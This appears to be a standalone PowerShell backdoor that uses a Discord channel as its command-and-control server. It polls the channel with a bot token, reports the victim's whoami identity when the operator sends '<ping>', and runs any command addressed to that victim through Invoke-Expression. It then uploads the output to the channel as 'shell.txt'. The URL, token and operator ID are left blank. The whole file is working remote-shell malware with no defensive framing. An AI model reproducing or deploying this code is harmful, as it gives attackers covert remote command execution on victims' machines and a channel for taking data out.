Start-Sleep -Seconds 15

$WhoAmI_Output = Invoke-Expression -Command "whoami"

$url = ""
$discordToken = ""

$master_ID = ""

$headers = @{
    Authorization = $discordToken
}

while ($true) {
    Start-Sleep -Seconds 15

    $response = Invoke-WebRequest -Uri ($url + "?limit=1") -Headers $headers

    if ($response.StatusCode -eq 200) {
        $messageData = $response.Content | ConvertFrom-Json

        $start_w = "<" + $WhoAmI_Output + ">*"

        if ($messageData[0].author.id -eq $master_ID) {
            if ($messageData[0].content -like "<ping>*") {
                Start-Sleep -Seconds 25

                $body = @{
                    "content" = $WhoAmI_Output
                }
    
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
        

            } elseif ($messageData[0].content -like $start_w) {
                $shellCommand = $messageData[0].content.Substring($WhoAmI_Output.Length + 2)
            
                Try {
                    $result = Invoke-Expression $shellCommand 2>&1 | Out-String;

                    $boundary = [System.Guid]::NewGuid().ToString()

                    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="shell.txt"
Content-Type: application/octet-stream

$result
--$boundary
Content-Disposition: form-data; name="content"

shell output:
--$boundary--
"@

                    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"

                } catch {
                    $body = @{
                        "content" = $_.Exception.Message
                    }
        
                    $bodyJson = $body | ConvertTo-Json
                    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
                }
            }
        }
    }
}
